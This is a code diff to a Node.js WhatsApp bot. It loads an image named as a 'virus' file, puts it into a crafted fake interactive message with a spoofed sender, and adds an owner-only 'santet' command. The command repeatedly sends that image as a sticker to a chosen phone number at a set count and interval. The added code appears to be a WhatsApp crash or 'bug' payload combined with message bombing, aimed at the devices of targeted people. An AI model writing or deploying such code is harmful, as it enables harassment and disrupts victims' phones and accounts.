@@ -38,6 +38,7 @@ const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
 const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
 const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
 const thumb = fs.readFileSync(`./image/lol.jpg`)
+const virusgambar = fs.readFileSync(`./image/virgam.jpeg`)
 
 
 module.exports = conn = async (conn, m, chatUpdate, store) => {
@@ -297,18 +298,19 @@ const fpayment = {
 "text": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
 }
 }}}}
-const kalgans = { 
-key: {
-fromMe: [], 
-participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
-},
+const shinuwu = { 
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        },
 
 'message': {
 	"interactiveMessage": {
 						"header": {
 						
 							"hasMediaAttachment": [],
-							"jpegThumbnail": thumb,
+							"jpegThumbnail": virusgambar,
 													},
 						"nativeFlowMessage": {
 "buttons": [
@@ -1549,6 +1551,18 @@ for (let i = 0; i < jumlah ; i++){
  }
 }
 conn.relayMessage(nomor, call, {})
+}
+}
+break
+case 'santet': {
+if (!isCreator) return
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+for (let i = 0; i < jumlah ; i++){
+conn.sendMessage(nomor, { sticker : virusgambar }, { quoted: shinuwu })
+await sleep(60* secon)
 }
 }
 break
